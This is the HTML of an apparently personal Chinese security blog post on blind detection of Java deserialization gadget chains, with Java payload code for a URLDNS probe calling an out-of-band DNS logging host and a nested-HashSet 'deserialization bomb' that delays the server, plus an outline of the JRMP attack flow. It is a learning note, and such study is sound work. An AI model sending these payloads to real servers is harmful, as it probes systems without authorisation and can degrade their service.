@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            Java反序列化链探测 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Java反序列化链探测
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-10-30 14:17:29</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Thu Oct 30 2025 14:18:13 GMT+0800">2025-10-30 14:18:13</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.5k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>6 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前面试的时候有被问到怎么在黑盒的条件下去探测存在的利用链。现在来学习一下。</p>
+<p>这里主要有两种方式，一种靠出网探测，一种靠延时。</p>
+<h1 id="serialVersionUID问题"><a href="#serialVersionUID问题" class="headerlink" title="serialVersionUID问题"></a>serialVersionUID问题</h1><p>不知道大家有没有遇到过这个问题：确定服务端有CB依赖，但是却打不通CB链。</p>
+<p>有些时候，这个问题就是由serialVersionUID不同导致的。</p>
+<p>一个依赖可能有多个版本，而每个版本中的同名类，可能会有变化。serialVersionUID(后面简称suid)就是为了解决这个问题而出现的。这表现在，本地通过cb1.9.4生成的利用链，到服务端cb1.8.3就打不了。</p>
+<p>所以，在探测利用链时，我们也需要解决这个问题。否则可能出现，服务端明明有这个类，但是由于suid不同，导致我们误判不存在此依赖。</p>
+<p>看一下suid不同报错抛出的代码段：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761802326615-aa522f8a-4426-4d66-98b6-4a7384150f08.png"  alt="img"></p>
+<p>这里有三个条件：</p>
+<p>1、序列化数据中的类和目标类都是可序列化的，就是继承Serializable接口</p>
+<p>2、序列化数据中的类不是数组</p>
+<p>3、序列化数据中的类的suid，和本地类中的不一样</p>
+<p>当这三个条件都满足时，会抛出suid不同的报错。</p>
+<p>所以，我们现在想办法不满足任意一个条件就行。</p>
+<p>这里可以生成不继承Serializable接口的类，或者序列化时使用类数组，即序列化A[].class</p>
+<p>这里我选择第一种方法，用Javasissit生成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成不继承Serializable接口的Class，防止因suid不一样报错</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title function_">makeClass</span><span class="params">(String className, String suid)</span> <span class="keyword">throws</span> ClassNotFoundException, CannotCompileException &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(className);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (suid != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 添加 serialVersionUID 字段并指定其值</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">serialVersionUIDField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.longType, <span class="string">&quot;serialVersionUID&quot;</span>, ctClass);</span><br><span class="line">        serialVersionUIDField.setModifiers(Modifier.PRIVATE | Modifier.STATIC | Modifier.FINAL);  <span class="comment">// 设置为private static final</span></span><br><span class="line">        ctClass.addField(serialVersionUIDField, suid);  <span class="comment">// 设置 serialVersionUID 值为 1L</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; aClass = ctClass.toClass();</span><br><span class="line">    <span class="keyword">return</span> aClass;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面还可以添加suid，这样能够准确探测依赖版本。</p>
+<h1 id="出网探测"><a href="#出网探测" class="headerlink" title="出网探测"></a>出网探测</h1><h2 id="DNS法"><a href="#DNS法" class="headerlink" title="DNS法"></a>DNS法</h2><p>这里依靠的是URLDNS链。</p>
+<p>我们的目标是，如果依赖存在，则顺利进入URLDNS链；如果依赖不存在，则在发出DNS请求前，抛出报错终止。</p>
+<p>URLDNS链的触发方法为URL.hashCode，反映在HashMap.readObject里，就是hash(key)，所以，URL类一定是作为key的。那我们要探测的类，就理应是value。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761802809472-3a293056-0c3e-4304-a873-2e342c1ba4f8.png"  alt="img"></p>
+<p>当HashMap反序列化value时，如果value是个不存在的类，那就会直接报错终止，不进入到最终的DNS请求。</p>
+<p>所以exp如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindClassByDns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FindClassByDns</span> <span class="variable">findClassByDns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FindClassByDns</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://cb123.hpdth2.ceye.io&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> findClassByDns.getPayload(url, className);</span><br><span class="line">        ReflectTools.deser(<span class="literal">null</span>, payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPayload</span><span class="params">(String url, String className)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">urlStreamHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, urlStreamHandler);</span><br><span class="line">        ReflectTools.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(u, ReflectTools.makeClass(className, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line">        ReflectTools.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ReflectTools.ser2bytes(hashMap);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="JRMP法"><a href="#JRMP法" class="headerlink" title="JRMP法"></a>JRMP法</h2><p>当服务端开启RMI注册中心时，可以使用JRMP法探测。</p>
+<p>简单讲一下JRMP的攻击流程：</p>
+<p>1、攻击机构造特殊的UnicastRef对象的序列化数据，发送给受害机的注册中心</p>
+<p>2、注册中心从序列化数据里取出恶意JRMP服务的地址，并发起请求</p>
+<p>3、恶意JRMP响应请求，返回恶意序列化数据</p>
+<p>4、注册中心直接反序列化数据，从而触发代码执行</p>
+<p>JRMP的知识可以参考下面的文章：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15240" >https://xz.aliyun.com/news/15240<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://gaorenyusi.github.io/posts/jrmp/" >https://gaorenyusi.github.io/posts/jrmp/<i class="fas fa-external-link-alt"></i></a></p>
+<p>目前还不是特别清楚为什么要这样去探测。也许是目标dns不出网，而且没有反序列化入口，但是开着RMI注册中心？也许是为了绕JEP290的限制？总之，感觉这种探测方法十分麻烦。</p>
+<h2 id="httplog"><a href="#httplog" class="headerlink" title="httplog"></a>httplog</h2><p>这个跟DNS差不多，只是协议换成http了。本地没去写了。</p>
+<h1 id="不出网探测"><a href="#不出网探测" class="headerlink" title="不出网探测"></a>不出网探测</h1><h2 id="反序列化炸弹"><a href="#反序列化炸弹" class="headerlink" title="反序列化炸弹"></a>反序列化炸弹</h2><p>这里的想法是，构造一个嵌套了很多层的对象，且在反序列化的时候会触发比较耗时的操作，比如计算hashCode什么的。</p>
+<p>这里我们选择HashSet。</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761804444527-9db03622-6685-4ffe-b02c-3215b75fd97b.png"  alt="img"></p>
+<p>HashSet反序列化最后，会把元素put进HashMap里，而put会触发key.hashCode，这个我们很熟悉了。看看HashSet.hashCode：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761804514913-43484f9e-23a4-4b6d-a69c-aad9b0474089.png"  alt="img"></p>
+<p>用的是父类，AbstractSet里的hashCode方法。这里能够看出，计算hash时，是需要依次计算里面所有的元素的。这样一来，如果我们实现HashSet套HashSet，计算量就会指数增长。</p>
+<p>最终的exp：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tools.ReflectTools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindClassByBomb</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FindClassByBomb</span> <span class="variable">findClassByBomb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FindClassByBomb</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> findClassByBomb.getPayload(<span class="string">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span>, <span class="number">28</span>);</span><br><span class="line">        <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        System.out.println(date);</span><br><span class="line">        ReflectTools.deser(<span class="literal">null</span>, payload);</span><br><span class="line">        <span class="type">Date</span> <span class="variable">date1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        System.out.println(date1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPayload</span><span class="params">(String className, <span class="type">int</span> depth)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Set&lt;Object&gt; root = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;Object&gt; s1 = root;</span><br><span class="line">        Set&lt;Object&gt; s2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Class&lt;?&gt; aClass = ReflectTools.makeClass(className, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; depth; i++) &#123;</span><br><span class="line">            Set&lt;Object&gt; t1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            Set&lt;Object&gt; t2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            t1.add(aClass); <span class="comment">// Make t1 unequal to t2</span></span><br><span class="line">            s1.add(t1);</span><br><span class="line">            s1.add(t2);</span><br><span class="line">            s2.add(t1);</span><br><span class="line">            s2.add(t2);</span><br><span class="line">            s1 = t1;</span><br><span class="line">            s2 = t2;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ReflectTools.ser2bytes(root);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终的序列化对象的图示：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761804635800-4d3b9003-cdfe-4a5f-9969-12a4625d12c6.png"  alt="img"></p>
+<p>经过前人验证，这里的深度选择25~28一般能满足大部分探测需求。反正别一下子写太大，不然容易影响正常业务。</p>
+<p>本地28层，延时了10s：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761804756985-b6c694a9-7ca5-451e-b67e-14051dba0ae4.png"  alt="img"></p>
+<h1 id="配合checklist"><a href="#配合checklist" class="headerlink" title="配合checklist"></a>配合checklist</h1><p>知道了探测原理后，我们可以自己维护一个checklist，里面记录常见依赖里必须有的类，不同版本依赖中同一个类的suid。这样就能通过写脚本的方式，去批量进行探测。</p>
+<p>类似：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1761804948995-32a0e0df-67fe-4b6c-8df1-9dbe18107c1f.png"  alt="img"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link"   target="_blank" rel="noopener" href="https://gv7.me/articles/2021/construct-java-detection-class-deserialization-gadget/#0x06-%E9%85%8D%E5%90%88class-checklist%E9%A3%9F%E7%94%A8" >https://gv7.me/articles/2021/construct-java-detection-class-deserialization-gadget/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/nevermorewo/article/details/100100048" >https://blog.csdn.net/nevermorewo/article/details/100100048<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                Java反序列化链探测
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/10/30/Java反序列化链探测/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-10-30 14:17</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/10/27/CC%E9%93%BE%E5%86%8D%E6%8C%96%E6%8E%98/"
+                                   title="CC链再挖掘"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">CC链再挖掘</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#serialVersionUID%E9%97%AE%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">serialVersionUID问题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%BA%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.</span> <span class="nav-text">出网探测</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E6%B3%95"><span class="nav-number">3.1.</span> <span class="nav-text">DNS法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JRMP%E6%B3%95"><span class="nav-number">3.2.</span> <span class="nav-text">JRMP法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#httplog"><span class="nav-number">3.3.</span> <span class="nav-text">httplog</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.</span> <span class="nav-text">不出网探测</span></a><ol 